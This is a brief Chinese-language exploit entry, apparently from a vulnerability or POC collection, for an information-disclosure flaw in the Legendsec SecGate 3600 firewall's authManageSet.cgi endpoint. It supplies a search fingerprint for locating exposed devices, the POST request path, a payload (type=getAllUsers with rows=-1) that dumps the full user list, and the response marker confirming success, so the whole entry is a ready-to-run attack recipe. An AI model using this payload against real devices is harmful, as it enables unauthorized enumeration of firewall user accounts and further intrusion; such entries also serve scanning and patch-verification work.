# 网神SecGate3600authManageSet.cgi信息泄露漏洞

网神SecGate3600authManageSet.cgi ｜ 信息泄露 ｜ —
- **指纹**：`body="sec_gate_image/login_02.gif"`
- **请求**：`POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1`

**Payload**
```
type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```
- **响应特征**：200 rows